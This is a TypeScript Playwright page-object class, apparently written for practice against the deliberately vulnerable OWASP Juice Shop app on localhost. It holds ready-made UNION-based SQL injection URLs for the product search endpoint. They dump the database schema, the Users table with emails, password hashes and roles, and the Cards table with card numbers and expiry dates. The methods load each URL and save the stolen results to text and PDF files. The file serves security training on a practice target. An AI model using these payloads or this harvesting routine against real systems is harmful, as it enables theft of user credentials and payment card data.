import { expect, Page } from '@playwright/test';
import { promises as fs } from 'fs';

export class ProductsPage {
    private page: Page;

    private db_schema_sqlInjection_url = "http://localhost:3000/rest/products/search?q=qwert%27))%20UNION%20SELECT%20sql,%20%272%27,%20%273%27,%20%274%27,%20%275%27,%20%276%27,%20%277%27,%20%278%27,%20%279%27%20FROM%20sqlite_master--";
    private users_table_sqlInjection_url = "http://localhost:3000/rest/products/search?q=qwert%27))%20UNION%20SELECT%20id,%20username,%20email,%20password,%20role,%20isActive,%20createdAt,%20%278%27,%20%279%27%20FROM%20Users--";
    private cards_table_sqlInjection_url = "http://localhost:3000/rest/products/search?q=qwert%27))%20UNION%20SELECT%20id,%20fullName,%20cardNum,%20expMonth,%20expYear,%20UserId,%20createdAt,%20updatedAt,%20%27PLACEHOLDER%27%20FROM%20Cards--";

  constructor(page: Page) {
    this.page = page;
  }


  async getRequestResponse() {
    return new Promise((resolve) => {
        this.page.on('response', async (response) => {
            if (response.url().includes('/rest/products/search')) {
                resolve(await response.json()); 
            }
        });
    });
  }

  async getDBSchema() {

    const responsePromise = this.getRequestResponse();
    await this.page.goto(this.db_schema_sqlInjection_url);
    const response = await responsePromise; 
    const responseText = JSON.stringify(response, null, 2);
    await fs.writeFile('owasp_juiceshop_db_schema.txt', responseText, 'utf-8');
    await this.page.pdf({ path: 'owasp_juiceshop_db_schema.pdf', format: 'A4' });

  }

  async getUsersTableValues(){
    const responsePromise = this.getRequestResponse(); 
    await this.page.goto(this.users_table_sqlInjection_url); 
    const response = await responsePromise; 
    const responseText = JSON.stringify(response, null, 2);
    await fs.writeFile('owasp_juiceshop_users_table.txt', responseText, 'utf-8');
    await this.page.pdf({ path: 'owasp_juiceshop_users_table.pdf', format: 'A4' });
  }

  async getCardsTableValues() {
    const responsePromise = this.getRequestResponse(); 
    await this.page.goto(this.cards_table_sqlInjection_url); 
    const response = await responsePromise; 
    const responseText = JSON.stringify(response, null, 2);
    await fs.writeFile('owasp_juiceshop_cards_table.txt', responseText, 'utf-8');
    await this.page.pdf({ path: 'owasp_juiceshop_cards_table.pdf', format: 'A4' });
  }

  async isErrorMessageVisible(): Promise<boolean> {
    return this.page.isVisible('.error-message');
  }
}